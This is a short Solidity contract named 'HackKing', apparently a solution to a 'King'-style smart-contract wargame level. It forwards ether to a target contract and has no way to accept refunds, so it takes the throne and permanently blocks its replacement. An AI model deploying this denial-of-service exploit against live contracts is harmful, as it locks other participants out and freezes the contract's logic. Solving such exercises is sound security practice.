//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract HackKing {
    address payable kingaddr;
    //bool done = false;

    constructor(address payable _kingaddr) {
        kingaddr = _kingaddr;
    }

    function once() public payable {
        kingaddr.call{value: msg.value}("");
    }
}